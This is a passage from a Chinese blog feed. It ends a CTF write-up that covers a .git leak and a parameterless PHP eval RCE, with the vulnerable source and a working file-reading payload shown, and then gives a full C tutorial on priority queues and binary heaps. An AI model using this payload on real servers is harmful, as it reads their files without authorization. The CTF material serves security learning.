alt="image-20240222193409390"></p><p>flag在哪里呢？</p><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><p>老规矩，看源码。但是源码也没有找到信息，那就只能老老实实开dirsearch扫描了。扫描过程中发现有<code>/.git/HEAD</code>等文件，猜测存在git泄露，用githack工具扫一遍，果然抓到了泄露的git包。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193643988.png" alt="image-20240222193643988"></p><p>flag.php里没什么有用的信息，重要的是我们得到了index.php的源码。</p><h3 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出有一个敏感函数<code>@eval($_GET[&#39;exp&#39;]);</code>，但是前面有三层WAF。第一层WAF基本堵死了伪协议，第二层WAF递归正则要求exp不能含有参数，第三层WAF过滤了一些文件名（我也不知道它想干啥）。</p><p>这道题和[湖南省网络攻防邀请大赛-ezrce](# 湖南省网络攻防邀请大赛-ezrce)有异曲同工之妙，我们可以直接套它的exp<code>highlight_file(next(array_reverse(scandir(current(localeconv())))));</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222194901564.png" alt="image-20240222194901564"></p><p>果不其然直接就出了。</p><h3 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h3><p>见本章第一题。</p><hr><p>（分割线~）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/c74d52864acadc32631ab8b75a6cb15.jpg" alt="c74d52864acadc32631ab8b75a6cb15"></p>]]></content>
    
    
    <summary type="html">关于CTF中Web的RCE问题汇总。包括题目和相关知识点的介绍。</summary>
    
    
    
    <category term="CTF Write Up" scheme="http://example.com/categories/CTF-Write-Up/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>数据结构什锦（五点五）——优先队列和堆</title>
    <link href="http://example.com/2023/11/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%BA%94%E7%82%B9%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%E5%92%8C%E5%A0%86/"/>
    <id>http://example.com/2023/11/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%BA%94%E7%82%B9%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%E5%92%8C%E5%A0%86/</id>
    <published>2023-11-27T06:43:52.000Z</published>
    <updated>2023-11-27T07:00:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>在学习图论时遇到一点阻碍，涉及到路径规划算法部分涉及到了优先队列的知识点。所以，作为前置知识，我们先来学习一下优先队列。</p><hr><h2 id="什么是优先队列"><a href="#什么是优先队列" class="headerlink" title="什么是优先队列"></a>什么是优先队列</h2><p>优先队列与队列的听起来很像，区别在于：优先队列是根据元素的优先级而不是先进先出的顺序来处理数据。比如一个作业调度系统，决定作业调度顺序的是作业优先级而不是先进先出原则。故我们要从一堆元素中找出元素的最大值&#x2F;最小值，就可以使用优先队列ADT进行操作。优先队列是一种支持插入、删除最小值（删除并返回最小值）、删除最大值（删除并返回最大值）操作的数据结构。</p><p>如果具有最小关键字的元素具有最高优先级（总是删除最小元素），那么这种优先队列被称为<em>上升优先（ascending-priority）队列</em>。类似的，如果具有最大关键字的元素具有最高优先级（总是删除最大元素），那么这种队列就是<em>下降优先级（descending-priority）队列</em>。因为这两种队列是对称的，所以我们仅讨论上升优先队列。</p><h2 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h2><p>我们先给出该ADT的操作部分。</p><h3 id="主要操作"><a href="#主要操作" class="headerlink" title="主要操作"></a>主要操作</h3><p>优先队列是一种数据元素的容器，每个元素具有一个关联的关键字。</p><ul><li>Insert（key,data）:插入一个关键字为key的数据元素到优先队列中，数据元素基于关键字有序。</li><li>DeleteMin&#x2F;DeleteMax：删除并返回具有最小值&#x2F;最大值关键字的元素。 </li><li>GetMinimum&#x2F;GetMaximum：返回具有最小&#x2F;最大关键字的元素。</li></ul><h3 id="辅助操作"><a href="#辅助操作" class="headerlink" title="辅助操作"></a>辅助操作</h3><ul><li>第k小&#x2F;第k大：返回优先队列中第k小&#x2F;第k大的元素</li><li>大小：返回优先队列中的数据元素个数</li><li>堆排序：基于优先级（关键字）对优先队列中的数据进行排序</li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>优先队列有很多应用。</p><ul><li>数据压缩：Huffmanm编码算法</li><li>最短路径算法：Dijkstra算法</li><li>最小生成树算法：Prim算法</li><li>事件驱动仿真：客户排队</li><li>选择问题：查找第k小的元素</li></ul><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>下面我们来探讨优先队列的具体实现，接下来我们来给出优先队列的几种可能的实现方式。</p><h3 id="基于无序数组的实现"><a href="#基于无序数组的实现" class="headerlink" title="基于无序数组的实现"></a>基于无序数组的实现</h3><p>元素插入数组时不考虑排序，每次删除操作时先搜索最小关键字再进行操作。</p><h3 id="基于无序链表的实现"><a href="#基于无序链表的实现" class="headerlink" title="基于无序链表的实现"></a>基于无序链表的实现</h3><p>这种实现方式和基于无序数组的实现方式非常相似，只不过使用的是链表而非数组罢了。</p><h3 id="基于有序数组的实现"><a href="#基于有序数组的实现" class="headerlink" title="基于有序数组的实现"></a>基于有序数组的实现</h3><p>基于数组元素的关键字进行排序，我们将数据插入到数组适当的位置上，这样在删除元素时只需要在数组的一端进行操作。</p><h3 id="基于有序链表的实现"><a href="#基于有序链表的实现" class="headerlink" title="基于有序链表的实现"></a>基于有序链表的实现</h3><p>基于数据元素关键字的排序顺序，将数据元素插入在链表的适当位置上，删除元素只需要在链表的一端进行，这样既保留了优先队列的状态，又可以继续使用其他的链表ADT相关函数。</p><h3 id="基于二叉树的实现"><a href="#基于二叉树的实现" class="headerlink" title="基于二叉树的实现"></a>基于二叉树的实现</h3><p>如果插入的元素是随机给定的，那么插入和删除操作的平均时间复杂度将降至O(log<del>n</del>)。</p><h3 id="基于平衡搜索二叉树的实现"><a href="#基于平衡搜索二叉树的实现" class="headerlink" title="基于平衡搜索二叉树的实现"></a>基于平衡搜索二叉树的实现</h3><p>插入和删除操作的最坏时间复杂度为O(log<del>n</del>)。</p><h3 id="基于二项堆的实现"><a href="#基于二项堆的实现" class="headerlink" title="基于二项堆的实现"></a>基于二项堆的实现</h3><p>接下来我们将详细讨论这种实现方式。它的搜索、插入和删除操作时间复杂度均为O(log<del>n</del>)，查找最大或最小元素的操作为O(1)。</p><h2 id="堆和二项堆"><a href="#堆和二项堆" class="headerlink" title="堆和二项堆"></a>堆和二项堆</h2><p><strong>堆是具有某种特定性质的树</strong>。堆的基本要求是：其节点的值必须大于等于（或者小于等于）它孩子节点的值。这被称为<em>堆的性质</em>。堆还拥有其他性质：比如某h&gt;0的堆，其叶子节点全部分布在第h层或者h－1层(参考完全二叉树)。这意味着，堆应该看起来像是一棵完全二叉树。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))  </pre></div><p>根据堆的性质，我们可以把堆分为两类。</p><ul><li>小顶堆（min heap）：节点的值必须小于等于它孩子节点的值。（两个都得小与，故我这本书p207这里的图是错误的）</li><li>大顶堆（max heap）：节点的值必须大于等于它孩子节点的值。</li></ul><h2 id="二项堆"><a href="#二项堆" class="headerlink" title="二项堆"></a>二项堆</h2><p>在二项堆中，每个节点最多只能有两个孩子。在实际应用中，二项堆已经够用了，所以接下来我们将着重讨论二项小顶堆（binary min heap）和二项大顶堆（binary max heap）。</p><p>根据我们前面介绍的实现方法，我们既可以用数组来线性存储，也可以用指针来链式存储。这里我们主要学习一下利用数组来实现的堆。</p><p>注意：以下的讨论我们都是假设在大顶堆上进行操作的。</p><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>堆的声明代码如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Heap</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">int</span> count;<span class="comment">//堆中数据元素的个数，即堆的大小</span></span><br><span class="line">    <span class="type">int</span> capacity;<span class="comment">//堆的容量</span></span><br><span class="line">    <span class="type">int</span> heap_type;<span class="comment">//小顶堆或大顶堆</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="创建堆"><a href="#创建堆" class="headerlink" title="创建堆"></a>创建堆</h3><p>创建堆的代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Heap*<span class="title function_">CreatHeap</span><span class="params">(<span class="type">int</span> capacity,<span class="type">int</span> heap_type)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Heap</span>*<span class="title">h</span>=</span>(<span class="keyword">struct</span> Heap*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> Heap));</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    h-&gt;heap_type=heap_type;</span><br><span class="line">    h-&gt;count=<span class="number">0</span>;</span><br><span class="line">    h-&gt;capacity=capacity;</span><br><span class="line">    h-&gt;<span class="built_in">array</span>=(<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="type">int</span>)*capacity);</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;<span class="built_in">array</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="节点的双亲"><a href="#节点的双亲" class="headerlink" title="节点的双亲"></a>节点的双亲</h3><p>位于第i个位置的元素它的双亲节点位于第i-1&#x2F;2的位置上。比如第二个位置的元素的双亲结点在第0个位置上。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">parent</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=<span class="number">0</span>||i&gt;=h-&gt;count)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> (i<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="节点的孩子"><a href="#节点的孩子" class="headerlink" title="节点的孩子"></a>节点的孩子</h3><p>类似于上面对双亲的讨论，第i个位置的节点的孩子分别在2*i+1和2*i+2的位置上。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LeftChild</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="type">int</span> left=<span class="number">2</span>*i+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (left&gt;=h-&gt;count)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">RightChild</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="type">int</span> right=<span class="number">2</span>*i+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (right&gt;=h-&gt;count)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取最大值元素"><a href="#获取最大值元素" class="headerlink" title="获取最大值元素"></a>获取最大值元素</h3><p>因为在大顶堆中最大值元素总是位于根，所以它被存入h-&gt;array[0]。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetMaximum</span><span class="params">(<span class="keyword">struct</span> Heap*h)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;count==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> h-&gt;<span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调整堆元素"><a href="#调整堆元素" class="headerlink" title="调整堆元素"></a>调整堆元素</h3><p>插入元素到堆后，可能无法满足堆的性质。这时我们就要调整堆中元素的位置使其重新成为堆，这个过程称为<em>堆调整</em>。</p><p>在大顶堆中，如果我们要进行堆调整，那么我们就找到不符合堆性质的节点，交换其与其孩子节点的最大值，然后重复这个步骤直到每个节点都满足堆的性质为止。</p><p>比如现在我们有一颗树，它的元素1并不满足堆的性质。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;2((1))1((31))--&gt;3((21))2((1))--&gt;4((5))2((1))--&gt;5((10))3((21))--&gt;6((12))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))5((10))--&gt;10((8))5((10))--&gt;11((7))  </pre></div><p>为了调整元素1，我们找到它的最大孩子10.然后对其交换位置。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;3((21))5((10))--&gt;4((5))5((10))--&gt;2((1))3((21))--&gt;6((12))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))2((1))--&gt;10((8))2((1))--&gt;11((7))  </pre></div><p>还是不符合堆的性质，现在继续互选元素1和元素8。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;3((21))5((10))--&gt;4((5))5((10))--&gt;10((8))3((21))--&gt;6((12))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))10((8))--&gt;2((1))10((8))--&gt;11((7))  </pre></div><p>现在这棵树满足堆的性质了。由于我们是自顶向下的方向来进行堆调整，所以我们称这种方法为<strong>向下渗透（percolate down）</strong>。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PercolateDown</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r,max,temp;</span><br><span class="line">    l= LeftChild(h,i);</span><br><span class="line">    r= RightChild(h,i);</span><br><span class="line">    <span class="keyword">if</span>(l!=<span class="number">-1</span>&amp;&amp;h-&gt;<span class="built_in">array</span>[l]&gt;h-&gt;<span class="built_in">array</span>[i])</span><br><span class="line">        max=l;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        max=i;</span><br><span class="line">    <span class="keyword">if</span>(r!=<span class="number">-1</span>&amp;&amp;h-&gt;<span class="built_in">array</span>[r]&gt;h-&gt;<span class="built_in">array</span>[max])</span><br><span class="line">        max=r;</span><br><span class="line">    <span class="keyword">if</span>(max!=i)&#123;</span><br><span class="line">        <span class="comment">//互换h-&gt;array[i]和array[max]</span></span><br><span class="line">        temp=h-&gt;<span class="built_in">array</span>[i];</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[i]=h-&gt;<span class="built_in">array</span>[max];</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[max]=temp;</span><br><span class="line">        <span class="comment">//重复递归直到顺序正常，最坏的情况就是到达某个叶子节点</span></span><br><span class="line">        PercolateDown(h, max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>堆只支持删除根节点元素的操作，也就是删除最大元素。在删除最大元素后，我们将最后一个节点移动到根节点，然后对根节点重新调用向下渗透来调整堆元素。简而言之分为三步：</p><ul><li>复制根节点元素到某个变量并准备返回</li><li>复制最后一个节点的元素到第一个元素的位置&#x2F;根节点</li><li>对第一个节点&#x2F;根节点调用向下渗透</li></ul><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">DeleteMax</span><span class="params">(<span class="keyword">struct</span> Heap*h)</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;count==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    data=h-&gt;<span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">    h-&gt;<span class="built_in">array</span>[<span class="number">0</span>]=h-&gt;<span class="built_in">array</span>[h-&gt;count<span class="number">-1</span>];</span><br><span class="line">    h-&gt;count--;<span class="comment">//堆大小减一</span></span><br><span class="line">    PercolateDown(h,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入元素"><a href="#插入元素" class="headerlink" title="插入元素"></a>插入元素</h3><p>插入元素与删除元素的步骤类似，都可以简单的分为三步。</p><ul><li>堆大小加一</li><li>将元素存放在堆&#x2F;树的末端</li><li>自底向上对该元素进行堆调整</li></ul><p>同样的，我们可以用图例来说明自底向上法是怎么进行的。假设我们向堆的末端插入了一个元素24。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;3((21))5((10))--&gt;4((5))5((10))--&gt;10((8))3((21))--&gt;6((12))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))10((8))--&gt;2((1))10((8))--&gt;11((7))6((12))--&gt;12((24))  </pre></div><p>调整堆，将24与其双亲结点进行比较，调换24与其双亲结点12。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;3((21))5((10))--&gt;4((5))5((10))--&gt;10((8))3((21))--&gt;12((24))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))10((8))--&gt;2((1))10((8))--&gt;11((7))12((24))--&gt;6((12))  </pre></div><p>重复以上步骤，继续调换24与21。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;12((24))5((10))--&gt;4((5))5((10))--&gt;10((8))12((24))--&gt;3((21))12((24))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))10((8))--&gt;2((1))10((8))--&gt;11((7))3((21))--&gt;6((12))  </pre></div><p>此时该堆满足堆的性质，调整完毕。因为我们是自底向上进行调整，所以我们称这种方法为<strong>向上渗透（percolate up）</strong>。</p><p>那么，插入的代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ResizeHeap</span><span class="params">(<span class="keyword">struct</span> Heap*h)</span>&#123;<span class="comment">//把堆大小扩大至原先的两倍</span></span><br><span class="line">    <span class="type">int</span> *array_old=h-&gt;<span class="built_in">array</span>;</span><br><span class="line">    h-&gt;<span class="built_in">array</span>=(<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="type">int</span>)*h-&gt;capacity*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;<span class="built_in">array</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; h-&gt;capacity; ++i) &#123;</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[i]=array_old[i];</span><br><span class="line">    &#125;</span><br><span class="line">    h-&gt;capacity*=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">free</span>(array_old);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> data)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;count==h-&gt;capacity)</span><br><span class="line">        ResizeHeap(h);</span><br><span class="line">    h-&gt;count++;</span><br><span class="line">    i=h-&gt;count<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i&gt;=<span class="number">0</span>&amp;&amp;data&gt;h-&gt;<span class="built_in">array</span>[parent(h,i)])&#123;</span><br><span class="line">        <span class="comment">//如果i大于零且要插入的数据比最后一个节点的双亲节点值要大</span></span><br><span class="line">        <span class="comment">//就把双亲结点移动到最后一个节点的位置</span></span><br><span class="line">        <span class="comment">//注意，此时最后一个节点没有插入数据，也就是说移动后的双亲结点位置的值是未定义的</span></span><br><span class="line">        h-&gt;<span class="built_in">array</span>[i]=h-&gt;<span class="built_in">array</span>[parent(h,i)];</span><br><span class="line">        i= parent(h,i);</span><br><span class="line">    &#125;</span><br><span class="line">    h-&gt;<span class="built_in">array</span>[i]=data;<span class="comment">//最后才讲data的值插入到正确的位置</span></span><br><span class="line">    <span class="comment">//然而我觉得开始时就先插入data的值，最后只要交换成功就完成会不会更好</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="撤销堆"><a href="#撤销堆" class="headerlink" title="撤销堆"></a>撤销堆</h3><p>堆的主要几个操作都介绍完毕了，最后我们要做的就是在程序关闭前释放堆的内存空间。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestroyHeap</span><span class="params">(<span class="keyword">struct</span> Heap*h)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">free</span>(h-&gt;<span class="built_in">array</span>);</span><br><span class="line">    <span class="built_in">free</span>(h);</span><br><span class="line">    h=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="将数组调整成堆"><a href="#将数组调整成堆" class="headerlink" title="将数组调整成堆"></a>将数组调整成堆</h3><p>建立堆的一个简单的方法是把n个输入元素放入一个空堆中。我们这里把元素直接存入一个数组，再把数组中的元素调整成堆。</p><p>首先我们考虑叶子节点。因为叶子节点无论如何都满足堆的性质，所以我们只需要关注非叶子节点的顺序。如何找到非叶子节点呢？我们知道最后一个叶子节点必然在h-&gt;count-1位置上，所以我们可以直接找到最后一个叶子节点的双亲来找到第一个非叶子节点，再对每一个非叶子节点应用向下渗透调整堆就可以了。</p><p>具体的代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BuildHeap</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> A[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n&gt;h-&gt;capacity)</span><br><span class="line">        ResizeHeap(h);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[i]=A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    h-&gt;count=n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = (n<span class="number">-1</span>)/<span class="number">2</span>; i &gt;=<span class="number">0</span> ; i--) &#123;</span><br><span class="line">        PercolateDown(h,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p>堆排序算法是排序算法中一个较为优秀的算法，它的时间复杂度只有O(n·log<del>n</del>)。</p><p>堆排序算法从一个无序数组中插入所有的元素进入堆中，然后再从元素的根节点处不断的删除元素直到堆为空为止。实际上就是把一个数组调整为堆，然后不断的按照出队最大元素&#x2F;最小元素来进行排序。</p><p>堆排序也可以通过数组实现。此时不是删除元素，而是通过交换第一个元素和最后一个元素，并减小堆大小来实现。然后我们对第一个元素再进行堆调整，持续这个过程直到堆中只剩下一个元素为止。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Heapsort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> n,<span class="type">int</span> heap_type)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Heap</span>*<span class="title">h</span>=</span> CreatHeap(n,heap_type);</span><br><span class="line">    <span class="type">int</span> old_size,i,temp;</span><br><span class="line">    BuildHeap(h,A,n);</span><br><span class="line">    old_size=h-&gt;count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = n<span class="number">-1</span>;  i&gt;<span class="number">0</span> ; i--) &#123;</span><br><span class="line">        <span class="comment">//h-&gt;array[0]是最大的元素</span></span><br><span class="line">        temp=h-&gt;<span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[<span class="number">0</span>]=h-&gt;<span class="built_in">array</span>[h-&gt;count<span class="number">-1</span>];</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[h-&gt;count<span class="number">-1</span>]=temp;</span><br><span class="line">        h-&gt;count--;</span><br><span class="line">        PercolateDown(h,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    h-&gt;count=old_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么堆和优先队列的学习到这里就结束啦！</p><p>PS：这本书的漏洞真的一大堆，部分地方数字标错了也就算了，有些算法根本就跑不通，还得我手动校正……</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/River%20&%20Faye%203.jpg" alt="River &amp; Faye 3"></p>]]></content>
    
    
    <summary type="html">在学习图论时遇到一点阻碍，涉及到路径规划算法部分涉及到了优先队列的知识点。所以，作为前置知识，我们先来学习一下优先队列。</summary>
    
    
    
